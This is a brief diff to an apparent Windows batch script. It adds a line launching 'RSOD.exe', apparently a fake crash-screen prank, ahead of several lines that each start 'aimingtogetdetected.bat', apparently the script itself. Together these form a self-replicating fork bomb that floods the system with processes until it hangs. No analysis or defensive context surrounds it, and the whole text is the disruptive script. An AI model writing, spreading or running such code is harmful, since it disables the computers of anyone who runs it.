@@ -1,4 +1,5 @@
-@Echo off
+@echo off
+start RSOD.exe
 start aimingtogetdetected.bat
 start aimingtogetdetected.bat
 start aimingtogetdetected.bat
